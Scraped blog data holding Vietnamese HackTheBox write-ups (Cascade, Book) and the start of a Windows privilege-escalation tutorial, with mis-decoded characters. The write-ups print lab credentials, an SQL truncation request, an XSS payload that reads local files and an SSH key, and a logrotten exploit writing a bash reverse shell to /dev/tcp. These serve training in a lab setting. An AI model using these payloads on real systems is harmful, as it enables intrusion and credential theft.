r.thompson:rY4n5eva@10.10.10.182 Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation Type help for list of commands # shares ADMIN$ Audit$ C$ Data IPC$ NETLOGON print$ SYSVOL   Sau khi kh√°m ph√° to√†n b·ªô n·ªôi dung ƒë∆∞·ª£c shares tr√™n smb, m√¨nh l·∫•y ƒë∆∞·ª£c file Meeting_Notes_June_2018.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  \u0026lt;p\u0026gt;For anyone that missed yesterdays meeting (Im looking at you Ben). Main points are below:\u0026lt;/p\u0026gt; \u0026lt;p class=MsoNormal\u0026gt;\u0026lt;o:p\u0026gt;\u0026amp;nbsp;\u0026lt;/o:p\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;-- New production network will be going live on Wednesday so keep an eye out for any issues. \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;-- The winner of the Best GPO competition will be announced on Friday so get your submissions in soon.\u0026lt;/p\u0026gt;   V√† 1 file VNC Install.reg ·ªü \\IT\\Temp\\s.smith\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  ‚ûú Cascade cat VNC\\ Install.reg Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC] [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC\\Server] \u0026#34;ExtraPorts\u0026#34;=\u0026#34;\u0026#34; \u0026#34;QueryTimeout\u0026#34;=dword:0000001e \u0026#34;QueryAcceptOnTimeout\u0026#34;=dword:00000000 \u0026#34;LocalInputPriorityTimeout\u0026#34;=dword:00000003 \u0026#34;LocalInputPriority\u0026#34;=dword:00000000 \u0026#34;BlockRemoteInput\u0026#34;=dword:00000000 \u0026#34;BlockLocalInput\u0026#34;=dword:00000000 \u0026#34;IpAccessControl\u0026#34;=\u0026#34;\u0026#34; \u0026#34;RfbPort\u0026#34;=dword:0000170c \u0026#34;HttpPort\u0026#34;=dword:000016a8 \u0026#34;DisconnectAction\u0026#34;=dword:00000000 \u0026#34;AcceptRfbConnections\u0026#34;=dword:00000001 \u0026#34;UseVncAuthentication\u0026#34;=dword:00000001 \u0026#34;UseControlAuthentication\u0026#34;=dword:00000000 \u0026#34;RepeatControlAuthentication\u0026#34;=dword:00000000 \u0026#34;LoopbackOnly\u0026#34;=dword:00000000 \u0026#34;AcceptHttpConnections\u0026#34;=dword:00000001 \u0026#34;LogLevel\u0026#34;=dword:00000000 \u0026#34;EnableFileTransfers\u0026#34;=dword:00000001 \u0026#34;RemoveWallpaper\u0026#34;=dword:00000001 \u0026#34;UseD3D\u0026#34;=dword:00000001 \u0026#34;UseMirrorDriver\u0026#34;=dword:00000001 \u0026#34;EnableUrlParams\u0026#34;=dword:00000001 \u0026#34;Password\u0026#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f \u0026#34;AlwaysShared\u0026#34;=dword:00000000 \u0026#34;NeverShared\u0026#34;=dword:00000000 \u0026#34;DisconnectClients\u0026#34;=dword:00000001 \u0026#34;PollingInterval\u0026#34;=dword:000003e8 \u0026#34;AllowLoopback\u0026#34;=dword:00000000 \u0026#34;VideoRecognitionInterval\u0026#34;=dword:00000bb8   Ch√∫ng ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c ƒëo·∫°n\n1  \u0026#34;Password\u0026#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f   Tuy nhi√™n ƒëo·∫°n hex passwd n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng v·ªõi ph·∫ßn m·ªÅm TightVNC ƒë·ªÉ l·∫•y ra ƒë∆∞·ª£c passwd ch√≠nh. C√≥ th·ªÉ s·ª≠ d·ª•ng script ·ªü ƒë√¢y https://github.com/trinitronx/vncpasswd.py ho·∫∑c s·ª≠ d·ª•ng ch∆∞∆°ng tr√¨nh vncpwd download cho Windows t·∫°i ƒë√¢y http://aluigi.altervista.org/pwdrec/vncpwd.zip\n·ªû ƒë√¢y m√¨nh ƒëang ch·∫°y windows n√™n ch·ªçn vncpwd ch·∫°y lu√¥n cho l·∫π\nPasswd l√† sT333ve2\nDo file n√†y ƒë∆∞·ª£c l·∫•y t·ª´ ng∆∞·ªùi d√πng s.smith n√™n m√¨nh ƒë√£ th·ª≠ lu√¥n passwd n√†y v·ªõi user n√†y lu√¥n v·ªõi Evil-WinRM V√† ch√∫ng ta c√≥ user\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ‚ûú Cascade evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\s.smith\\Documents\u0026gt; ls *Evil-WinRM* PS C:\\Users\\s.smith\\Documents\u0026gt; cd .. *Evil-WinRM* PS C:\\Users\\s.smith\u0026gt; cd Desktop *Evil-WinRM* PS C:\\Users\\s.smith\\Desktop\u0026gt; ls  Directory: C:\\Users\\s.smith\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 4/8/2020 4:07 PM 34 user.txt -a---- 3/25/2020 11:17 AM 1031 WinDirStat.lnk *Evil-WinRM* PS C:\\Users\\s.smith\\Desktop\u0026gt; cat user.txt 77d989cc96e4ab408eb522047a5ebe8c   Get Root Th·ª≠ t√¨m ki·∫øm xung quanh nh∆∞ng kh√¥ng ph√°t hi·ªán ra ƒë∆∞·ª£c g√¨ nhi·ªÅu, th·ª≠ ƒëƒÉng nh·∫≠p t√†i kho·∫£n s.smith v·ªõi d·ªãch v·ª• SMB xem c√≥ ƒëang ƒë∆∞·ª£c chia s·∫ª d·ªØ li·ªáu g√¨ kh√¥ng.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  ‚ûú ~ sudo smbclient.py s.smith:sT333ve2@10.10.10.182 Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation Type help for list of commands # shares ADMIN$ Audit$ C$ Data IPC$ NETLOGON print$ SYSVOL # use Audit$ # ls drw-rw-rw- 0 Thu Jan 30 01:01:26 2020 . drw-rw-rw- 0 Thu Jan 30 01:01:26 2020 .. -rw-rw-rw- 13312 Wed Jan 29 04:47:08 2020 CascAudit.exe -rw-rw-rw- 12288 Thu Jan 30 01:01:26 2020 CascCrypto.dll drw-rw-rw- 0 Wed Jan 29 04:43:18 2020 DB -rw-rw-rw- 45 Wed Jan 29 06:29:47 2020 RunAudit.bat -rw-rw-rw- 363520 Wed Jan 29 03:42:18 2020 System.Data.SQLite.dll -rw-rw-rw- 186880 Wed Jan 29 03:42:18 2020 System.Data.SQLite.EF6.dll drw-rw-rw- 0 Wed Jan 29 03:42:18 2020 x64 drw-rw-rw- 0 Wed Jan 29 03:42:18 2020 x86   Ch√∫ng ta l·∫•y ƒë∆∞·ª£c ch∆∞∆°ng tr√¨nh CaseAudit.exe v√† th∆∞ vi·ªán CascCrypto.dll d√πng ƒë·ªÉ m√£ ho√°. Trong th∆∞ m·ª•c DB c≈©ng l·∫•y ƒë∆∞·ª£c 1 file db sqlite3.\nN·ªôi dung file db\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ‚ûú Cascade sqlite3 Audit.db SQLite version 3.31.1 2020-01-27 19:55:54 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .table DeletedUserAudit Ldap Misc sqlite\u0026gt; select * from DeletedUserAudit ...\u0026gt; ; 6|test|Test DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local 7|deleted|deleted guy DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local 9|TempAdmin|TempAdmin DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local sqlite\u0026gt; select * from Ldap; 1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local sqlite\u0026gt; select * from Misc; sqlite\u0026gt;   Ch√∫ng ta l·∫•y ƒë∆∞·ª£c 1 ƒëo·∫°n encrypt b·∫±ng base64. Tuy nhi√™n sau khi gi·∫£i m√£ th√¨ d∆∞·ªùng nh∆∞ ƒëo·∫°n m√£ ho√° n√†y ph·∫£i th√™m 1 b∆∞·ªõc gi·∫£i m√£ n·ªØa. Th·ª±c hi·ªán decompile CaseAudit.exe v√† CaseCrypto.dll b·∫±ng dotPeek ƒë·ªÉ xem ch∆∞∆°ng tr√¨nh th·ª±c hi·ªán m√£ ho√° v√† gi·∫£i m√£ nh∆∞ n√†o.\nFile CaseCrypto.dll\nTh·ª±c hi·ªán gi·∫£i m√£ v·ªõi AES 128 bit, s·ª≠ d·ª•ng mode CBC, kho√° IV = 1tdyjCbY1Ix49842\nTi·∫øp t·ª•c bi√™n d·ªãch file CaseAudit.exe\nƒêo·∫°n code s·∫Ω truy v·∫•n v√†o b·∫£ng LDAP trong CSDL r·ªìi th·ª±c hi·ªán encrypt v·ªõi key=c4scadek3y654321. S·ª≠ d·ª•ng key v√† IV ƒë·ªÉ gi·∫£i m√£.\n·ªû ƒë√¢y m√¨nh s·ª≠ d·ª•ng CyberChef ƒë·ªÉ gi·∫£i m√£ Decrypt\nV·∫≠y ta thu ƒë∆∞·ª£c m·∫≠t kh·∫©u c·ªßa user ArkSvc:w3lc0meFr31nd\nTh·ª±c hi·ªán ƒëƒÉng nh·∫≠p v·ªõi Evil-WinRM v√† ch√∫ng ta c√≥\nKi·ªÉm tra 1 ch·ªß th·∫•y ng∆∞·ªùi d√πng Arksvc thu·ªôc Group AD Recycle Bin\nS·ª≠ d·ª•ng winPEAS.exe c≈©ng kh√¥ng thu ƒë∆∞·ª£c k·∫øt qu·∫£ g√¨, do m√¨nh thu·ªôc Group AD Recycle Bin, n√™n m√¨nh c√≥ th·ªÉ t√¨m ki·∫øm ƒë∆∞·ª£c ƒë√£ c√≥ nh·ªØng Account n√†o ƒë√£ b·ªã xo√°.\nhttps://social.technet.microsoft.com/Forums/en-US/5424e204-d601-4330-a7ed-331134e47e18/filter-deleted-users-in-getadobject-cmdlet-also-returns-deleted-computers?forum=ITCG\nSau khi googling th√¨ t√¨m ƒë∆∞·ª£c ƒëo·∫°n code nh∆∞ sau\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  *Evil-WinRM* PS C:\\Users\\arksvc\\Documents\u0026gt; get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq \u0026#34;user\u0026#34;} -IncludeDeletedObjects Deleted : True DistinguishedName : CN=CASC-WS1\\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local Name : CASC-WS1 DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe ObjectClass : computer ObjectGUID : 6d97daa4-2e82-4946-a11e-f91fa18bfabe Deleted : True DistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059   V·∫≠y l√† ch√∫ng ta c√≥ user TempAdmin ƒë√£ b·ªã xo√°, v·∫≠y c√≥ th·ªÉ kh√¥i ph·ª•c l·∫°i t√†i kho·∫£n n√†y v√† l√™n ƒë∆∞·ª£c admin hay kh√¥ng.\nNh∆∞ng user n√†y l·∫°i k c√≥ quy·ªÅn kh√¥i ph·ª•c l·∫°i account TempAdmin.\nTuy nhi√™n ch√∫ng ta c√≥ th·ªÉ xem ƒë∆∞·ª£c Properties c·ªßa account\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  *Evil-WinRM* PS C:\\Users\\arksvc\\Documents\u0026gt; get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq \u0026#34;user\u0026#34;} -IncludeDeletedObjects -Properties * accountExpires : 9223372036854775807 badPasswordTime : 0 badPwdCount : 0 CanonicalName : cascade.local/Deleted Objects/TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 cascadeLegacyPwd : YmFDVDNyMWFOMDBkbGVz CN : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 codePage : 0 countryCode : 0 Created : 1/27/2020 3:23:08 AM createTimeStamp : 1/27/2020 3:23:08 AM Deleted : True Description : DisplayName : TempAdmin DistinguishedName : CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local dSCorePropagationData : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM} givenName : TempAdmin instanceType : 4 isDeleted : True LastKnownParent : OU=Users,OU=UK,DC=cascade,DC=local lastLogoff : 0 lastLogon : 0 logonCount : 0 Modified : 1/27/2020 3:24:34 AM modifyTimeStamp : 1/27/2020 3:24:34 AM msDS-LastKnownRDN : TempAdmin Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059   L·∫°i 1 l·∫ßn n·ªØa th·∫•y s·ª± xu·∫•t hi·ªán c·ªßa cascadeLegacyPwd\n1 2  ‚ûú Cascade echo -n YmFDVDNyMWFOMDBkbGVz | base64 -d baCT3r1aN00dles   Th·ª≠ ƒëƒÉng nh·∫≠p v·ªõi t√†i kho·∫£n Administrator v·ªõi m·∫≠t kh·∫©u tr√™n\n1 2 3 4 5 6 7 8 9 10  ‚ûú Cascade evil-winrm -u Administrator -p baCT3r1aN00dles -i 10.10.10.182 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; cd .. *Evil-WinRM* PS C:\\Users\\Administrator\u0026gt; cd Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; cat root.txt 0ec81c0ccc6c0b0923b9db5e97dde189   ","permalink":"https://minhtuanact.ml/posts/hackthebox-writeup-cascade/","summary":"Cascade l√† b√†i th·ª© m·∫•y m√¨nh ch∆°i v·ªõi machine Windows tr√™n hackthebox c≈©ng kh√¥ng nh·ªõ n·ªØa, ch·ªâ nh·ªõ l√† b√†i n√†y m√¨nh l√†m v√†o ƒë√∫ng t·ªëi sinh nh·∫≠t nƒÉm nay c·ªßa m√¨nh. L√† m·ªôt b√†i kh√° hay v·ªõi LDAP, m√¨nh ƒë√£ h·ªçc h·ªèi ƒë∆∞·ª£c r·∫•t nhi·ªÅu th·ª© t·ª´ b√†i n√†y. Nh√¨n l∆∞·ª£t vote c≈©ng th·∫•y ƒë∆∞·ª£c b√†i n√†y ch·ªß y·∫øu s·ª≠ d·ª•ng k·ªπ thu·∫≠t Enumeration. Hi v·ªçng writeup n√†y gi√∫p √≠ch g√¨ ƒë∆∞·ª£c cho c√°c b·∫°n ƒë·ªçc b√†i n√†y :P.","title":"[Hackthebox - Writeup] Cascade"},{"content":"M·ªü ƒë·∫ßu Tr·ªü l·∫°i v·ªõi series Writeup Hackthebox, ng√†y h√¥m qua Hackthebox ƒë√£ cho retired b√†i Book n√†y, ƒë∆∞·ª£c ƒë√°nh gi√° l√† Medium. B√†i n√†y ƒë∆∞·ª£c m√¨nh l√†m t·ª´ 24/03 nh∆∞ng ƒë·∫øn gi·ªù m·ªõi ƒë∆∞·ª£c public. H√£y c√πng m√¨nh t√¨m hi·ªÉu xem b√†i n√†y ch∆°i th·∫ø n√†o nha.\nGet User Qu√©t nmap th·∫•y server n√†y c√≥ trang web t·∫°i c·ªïng 80. Th·ª±c hi·ªán ƒëƒÉng k√Ω th√¨ v√†o ·ªïn k c√≥ v·∫•n ƒë·ªÅ g√¨, th·ª±c hi·ªán ƒëƒÉng k√Ω theo mail admin@book.htb th√¨ b√°o t√†i kho·∫£n n√†y ƒë√£ t·ªìn t·∫°i.\nNh·ªõ ƒë·∫øn b√†i postbook ng√†y x∆∞a th√¨ ƒëƒÉng k√Ω ƒë∆∞·ª£c theo ƒë√∫ng email c·ªßa admin th√¨ ƒëƒÉng nh·∫≠p l·∫°i s·∫Ω l√™n ƒë∆∞·ª£c admin\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  POST /index.php HTTP/1.1 Host: 10.10.10.176 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.10.176/index.php Content-Type: application/x-www-form-urlencoded Content-Length: 59 Connection: close Cookie: PHPSESSID=ace5kg7uekbf6mo1bjjcb3iq6h Upgrade-Insecure-Requests: 1 name=admin\u0026amp;email=admin%40book.htb 11\u0026amp;password=admin@123   ·ªû ƒë√¢y ƒë∆∞·ª£c g·ªçi l√† t·∫•n c√¥ng SQL truncation. C·∫Øt ng·∫Øn chu·ªói SQL ƒë·ªÉ bypass check name.\nƒêƒÉng k√Ω ƒë∆∞·ª£c t√†i kho·∫£n admin th√¨ ng√≥ xung quanh xem c√≥ ch·ª©c nƒÉng g√¨.\nC√≥ 1 ch·ª©c nƒÉng l√† Collection, gi√∫p ƒëƒÉng s√°ch l√™n, v√† admin c√≥ 1 ch·ª©c nƒÉng l√† xem 1 danh s√°ch Collection ƒë√≥.\nV√† ƒë√¢y l√† n·ªôi dung c·ªßa Collections\n·ªû ƒë√¢y, trong trang web c√≥ 1 ch·ª©c nƒÉng l√† l·∫•y t√™n s√°ch v√† t√°c gi·∫£ ghi v√†o file PDF b·∫±ng JS ·ªü ph√≠a Server, qua ƒë√¢y c√≥ th·ªÉ s·ª≠ d·ª•ng JS ƒë·ªÉ ghi file local v√†o trong file PDF ƒë·ªÉ c√≥ th·ªÉ ƒë·ªçc\n1 2 3 4 5 6 7 8  \u0026lt;script\u0026gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open(\u0026#34;GET\u0026#34;,\u0026#34;file:///etc/passwd\u0026#34;); x.send(); \u0026lt;/script\u0026gt;   ƒêi·ªÅn t√™n s√°ch v·ªõi payload tr√™n v√† thu k·∫øt qu·∫£\nƒê·ªçc ƒë∆∞·ª£c file /etc/passwd, ch√∫ng ta c√≥ th·ªÉ ƒë·ªçc file key rsa ƒë·ªÉ c√≥ th·ªÉ ssh ƒë·∫øn server, ·ªü ƒë√¢y c√≥ ng∆∞·ªùi d√πng reader, c√≥ th·ªÉ ƒëo√°n th∆∞ m·ª•c key rsa l√† /home/reader/.ssh/id_rsa\nL·∫•y ƒë∆∞·ª£c file private key, c√≥ th·ªÉ s·ª≠ d·ª•ng ƒë·ªÉ ssh ƒë·∫øn server\nDo file PDF k hi·ªÉn th·ªã ƒë·∫ßy ƒë·ªß private key, ·ªü ƒë√¢y s·ª≠ d·ª•ng c√¥ng c·ª• ƒë·ªÉ convert pdf sang text ƒë·ªÉ l·∫•y h·∫øt text t·ª´ file pdf https://github.com/pdfminer/pdfminer.six/\nL·∫•y ƒë∆∞·ª£c privatekey r·ªìi th√¨ c√≥ th·ªÉ ssh ƒë·∫øn server\nL·∫•y c·ªù User\nGet Root Ch·∫°y pspy64 ƒë·ªÉ xem c√°c ti·∫øn tr√¨nh ƒëang ch·∫°y tr√™n server th√¨ th·∫•y\nRoot ƒëang ch·∫°y ch∆∞∆°ng tr√¨nh logrotate ƒë·ªÉ ghi v√†o log, t√¨m ki·∫øm tr√™n google xem ch∆∞∆°ng tr√¨nh n√†y c√≥ exploit nh∆∞ n√†o th√¨ c√≥ ch∆∞∆°ng tr√¨nh t·∫°i ƒë√¢y https://github.com/whotwagner/logrotten\nCompile gcc ch∆∞∆°ng tr√¨nh logrotten r·ªìi ƒë·∫©y l√™n tr√™n box, ƒë·ªçc h∆∞·ªõng d·∫´n ·ªü trang github th√¨ t·∫°o 1 file payload l∆∞u v√†o payloadfile\n1  reader@book:/tmp$ echo ‚Äúbash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.5/4444 0\u0026gt;\u0026amp;1‚Äù \u0026gt; payloadfile   Sau ƒë√≥ ch·∫°y ch∆∞∆°ng tr√¨nh v√† ghi v√†o file access.log th·∫•y ·ªü th∆∞ m·ª•c backups c·ªßa user\n1 2 3 4 5 6 7 8 9 10 11  reader@book:/tmp$ ./logrotten -p ./payloadfile ~/backups/access.log -d logfile: /home/reader/backups/access.log logpath: /home/reader/backups logpath2: /home/reader/backups2 targetpath: /etc/bash_completion.d/access.log targetdir: /etc/bash_completion.d p: access.log Waiting for rotating /home/reader/backups/access.log... Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d Waiting 1 seconds before writing payload... Done!   M·ªü th√™m 1 terminal n·ªØa ƒë·ªÉ ghi v√†o file access.log\n1  reader@book:~$ echo \u0026#39;1\u0026#39; \u0026gt; backups/access.log   L·∫ßn n√†y ch√∫ng ta ch·ªâ c√≥ 5s ƒë·ªÉ ƒë·ªçc c·ªù, sau ƒë√≥ l√† b·ªã ƒë√≥ng k·∫øt n·ªëi, t·∫°i m√°y l·∫Øng nghe c·ªïng 4444, sau khi l√™n root r·ªìi ƒë·ªçc c·ªù ngay :v\nK·∫øt M·ªôt b√†i m√† c√≥ kh√° nhi·ªÅu k·ªπ thu·∫≠t trong n√†y, hi v·ªçng m·ªçi ng∆∞·ªùi c√≥ th·ªÉ h·ªçc ƒë∆∞·ª£c g√¨ t·ª´ n√≥. Happy hacking!\n","permalink":"https://minhtuanact.ml/posts/hackthebox-writeup-book/","summary":"M·ªü ƒë·∫ßu Tr·ªü l·∫°i v·ªõi series Writeup Hackthebox, ng√†y h√¥m qua Hackthebox ƒë√£ cho retired b√†i Book n√†y, ƒë∆∞·ª£c ƒë√°nh gi√° l√† Medium. B√†i n√†y ƒë∆∞·ª£c m√¨nh l√†m t·ª´ 24/03 nh∆∞ng ƒë·∫øn gi·ªù m·ªõi ƒë∆∞·ª£c public. H√£y c√πng m√¨nh t√¨m hi·ªÉu xem b√†i n√†y ch∆°i th·∫ø n√†o nha.\nGet User Qu√©t nmap th·∫•y server n√†y c√≥ trang web t·∫°i c·ªïng 80. Th·ª±c hi·ªán ƒëƒÉng k√Ω th√¨ v√†o ·ªïn k c√≥ v·∫•n ƒë·ªÅ g√¨, th·ª±c hi·ªán ƒëƒÉng k√Ω theo mail admin@book.","title":"[Hackthebox- Writeup] Book"},{"content":"Gi·ªõi thi·ªáu Ng√†y tr∆∞·ªõc trong team m√¨nh c≈©ng ƒë√£ c√≥ @kongaconggo103 vi·∫øt series leo thang ƒë·∫∑c quy·ªÅn trong Linux, c√°c b·∫°n c√≥ th·ªÉ ƒë·ªçc t·∫°i\nLeo thang ƒë·∫∑c quy·ªÅn trong Linux - Linux Privilege Escalation #0: Using Sudo Rights \nLeo thang ƒë·∫∑c quy·ªÅn trong Linux - Linux Privilege Escalation #1: Using SUID bit \nLeo thang ƒë·∫∑c quy·ªÅn trong Linux - Linux Privilege Escalation #2: Using PATH Variables \nL·∫ßn n√†y m√¨nh tr·ªü l·∫°i v·ªõi series leo thang ƒë·∫∑c quy·ªÅn n√†y, tuy nhi√™n kh√¥ng ph·∫£i Linux n·ªØa m√† l√† m·ªôt h·ªá ƒëi·ªÅu h√†nh c·ª±c k·ª≥ th√¢n thu·ªôc ƒë·ªëi v·ªõi anh em, Windows.\nSau m·ªôt th·ªùi gian m√¨nh ch∆°i hackthebox v·ªõi kh√° nhi·ªÅu machine v·ªÅ Windows, nh·∫≠n th·∫•y r·∫±ng vi·ªác khai th√°c Windows Privilege Escalation c√≥ l·∫Ω l√† kh√° kh√°c tr√™n Linux v√¨ c·∫•u tr√∫c 2 h·ªá ƒëi·ªÅu h√†nh kh√°c nhau. B√†i vi·∫øt n√†y m√¨nh s·∫Ω b·∫Øt ƒë·∫ßu t·ª´ leo quy·ªÅn c∆° b·∫£n nh·∫•t ƒë·ªëi v·ªõi Windows ƒë·ªÉ m·ªçi ng∆∞·ªùi c√≥ th·ªÉ ti·∫øp c·∫≠n ƒë∆∞·ª£c m·ªôt c√°ch d·ªÖ d√†ng nh·∫•t. (H·ªìi m·ªõi b·∫Øt ƒë·∫ßu m√¨nh c≈©ng ƒë√£ kh√° b·ªëi r·ªëi v·ªõi vi·ªác leo quy·ªÅn tr√™n Windows n√†y).\nB√†i vi·∫øt n√†y ƒë∆∞·ª£c d·ª±a theo kho√° h·ªçc Windows Privilege Escalation for OSCP \u0026amp; Beyond!  tr√™n Udemy v√† Windows / Linux Local Privilege Escalation Workshop  c·ªßa sagishahar.\nService Exploits Unquoted Service Path Nguy√™n nh√¢n Khi c√°c d·ªãch v·ª• ƒë∆∞·ª£c t·∫°o m√† c√≥ ƒë∆∞·ªùng d·∫´n th·ª±c thi ch·ª©a space v√† kh√¥ng ƒë∆∞·ª£c ƒë·∫∑t trong d·∫•u ngo·∫∑c k√©p (ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi) th√¨ c√≥ th·ªÉ d·∫´n d·∫øn l·ªó h·ªïng Unquoted Service Path. L·ªó h·ªïng n√†y cho ph√©p ng∆∞·ªùi d√πng nh·∫≠n ƒë∆∞·ª£c c√°c quy·ªÅn h·∫°n c·ªßa SYSTEM (ch·ªâ khi vulnerable service ƒëang ƒë∆∞·ª£c c·∫•p quy·ªÅn SYSTEM ·ªü th·ªùi ƒëi·ªÉm ƒë√≥). L·ªó h·ªïng n√†y g·∫ßn gi·ªëng v·ªõi l·ªó h·ªïng PATH Variable tr√™n Linux.\nTrong Windows, n·∫øu d·ªãch v·ª• kh√¥ng ƒë·∫∑t trong ngo·∫∑c k√©p v√† c√≥ kho·∫£ng tr·∫Øng (space), n√≥ s·∫Ω x·ª≠ l√Ω kho·∫£ng tr·∫Øng (space) d∆∞·ªõi d·∫°ng ng·∫Øt d√≤ng l·ªánh v√† l·∫•y t·∫•t c·∫£ c√°c ph·∫ßn c√≤n l·∫°i l√†m ƒë·ªëi s·ªë.\nKhai th√°c ·ªû tr√™n Windows, khi t·∫°o m·ªôt ti·∫øn tr√¨nh cho m·ªôt ch∆∞∆°ng tr√¨nh (v√≠ d·ª• ch·ª©c nƒÉng autostart) th√¨ ch·ª©c nƒÉng CreatProcess s·∫Ω t·∫°o ra m·ªôt process m·ªõi c√πng v·ªõi lu·ªìng c·ªßa ch√≠nh n√≥. Tuy nhi√™n ch√∫ng ta k c·∫ßn quan t√¢m ƒë·∫øn ƒëi·ªÅu ƒë√≥ l·∫Øm, ƒëi·ªÅu quan tr·ªçng l√† ch·ª©c nƒÉng ƒë·∫•y c√≥ m·ªôt c√°i module x·ª≠ l√Ω tham s·ªë chu·ªói lpApplicationName. N√≥ s·∫Ω x·ª≠ l√Ω ƒë∆∞·ªùng d·∫´n ƒë·∫øn file ƒë∆∞·ª£c th·ª±c thi.\nL·∫•y v√≠ d·ª• nh∆∞ sau: M·ªôt ·ª©ng d·ª•ng autorun c√≥ ƒë∆∞·ªùng d·∫´n l√† C:\\Program Files\\A Subfolder\\B Subfolder\\C Subfolder\\SomeExecutable.exe, tuy nhi√™n, ng∆∞·ªùi qu·∫£n tr·ªã k ƒë·∫∑t ƒë∆∞·ªùng d·∫´n v√†o trong ngo·∫∑c k√©p, v·∫≠y n√™n Windows s·∫Ω x·ª≠ √Ω ch√∫ng theo c√°c b∆∞·ªõc t·ª´ 1 ƒë·∫øn 5 nh∆∞ sau:\n1 2 3 4 5  1. C:\\Program.exe 2. C:\\Program Files\\A.exe 3. C:\\Program Files\\A Subfolder\\B.exe 4. C:\\Program Files\\A Subfolder\\B Subfolder\\C.exe 5. C:\\Program Files\\A Subfolder\\B Subfolder\\C Subfolder\\SomeExecutable.exe   M·ªói khi g·∫∑p kho·∫£ng tr·∫Øng (space), Windows s·∫Ω t·ª± th√™m .exe v√†o ƒëu√¥i ƒë·ªÉ ki·ªÉm tra xem ch∆∞∆°ng tr√¨nh ƒë√≥ c√≥ t·ªìn t·∫°i ƒë·ªÉ th·ª±c thi hay kh√¥ng, n·∫øu kh√¥ng n√≥ s·∫Ω x·ª≠ l√Ω ti·∫øp ƒë∆∞·ªùng d·∫´n cho ƒë·∫øn khi n√†o th·ª±c hi·ªán ƒë∆∞·ª£c ho·∫∑c h·∫øt c√°c b∆∞·ªõc th√¨ th√¥i.\nL·ªó h·ªïng ƒë∆∞·ª£c x·∫£y ra t·ª´ ƒë√¢y, khi m√† user c√≥ quy·ªÅn ghi v√†o nh·ªØng th∆∞ m·ª•c kia, v√† ƒëi·ªÅn 1 ƒëo·∫°n shell th·ª±c thi v·ªõi file .exe th√¨ khi h·ªá th·ªëng kh·ªüi ƒë·ªông l·∫°i, Windows s·∫Ω auto kh·ªüi ƒë·ªông m·ªôt s·ªë d·ªãch v·ª• ƒë√≥ v√† n√≥ s·∫Ω v√¥ t√¨nh kh·ªüi ƒë·ªông con shell m√† m√¨nh t·∫°o n√™n. L√∫c n√†y ch√∫ng ta c√≥ quy·ªÅn SYSTEM cao nh·∫•t.\nV·∫≠y n·∫øu ta c√≥ quy·ªÅn ghi ·ªü 